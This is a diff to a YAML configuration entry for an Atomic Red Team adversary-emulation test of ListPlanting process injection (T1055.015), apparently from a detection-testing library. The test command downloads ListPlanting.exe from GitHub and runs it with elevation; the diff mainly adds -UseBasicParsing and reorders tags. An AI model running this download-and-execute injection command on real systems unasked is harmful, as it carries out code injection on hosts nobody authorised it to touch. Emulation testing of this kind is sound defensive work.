@@ -17,10 +17,10 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1055.015\bin\ListPlanting.exe") -ErrorAction ignore
           | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe"
-          -OutFile "PathToAtomicsFolder\T1055.015\bin\ListPlanting.exe"; fi; Start-Process
-          "PathToAtomicsFolder\T1055.015\bin\ListPlanting.exe"; Start-Sleep -Seconds
-          7; Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process
-          -Force'
+          -OutFile "PathToAtomicsFolder\T1055.015\bin\ListPlanting.exe" -UseBasicParsing;
+          fi; Start-Process "PathToAtomicsFolder\T1055.015\bin\ListPlanting.exe";
+          Start-Sleep -Seconds 7; Get-Process -Name Notepad -ErrorAction SilentlyContinue
+          | Stop-Process -Force'
         cleanup: Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process
           -Force
         elevation_required: true
@@ -30,9 +30,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
-  - privilege-escalation
   - t1055.015
+  - privilege-escalation
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -51,9 +51,9 @@
         ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe"
-        -OutFile "#{exe_binary}"
+        -OutFile "#{exe_binary}" -UseBasicParsing
 
         '
     technique_created: '2021-11-22T15:02:15.190Z'
     atomic_guid: 4f3c7502-b111-4dfe-8a6e-529307891a59
-    import_timestamp: '2026-10-20T07:08:27.575392Z'
+    import_timestamp: '2026-10-21T07:01:50.205727Z'
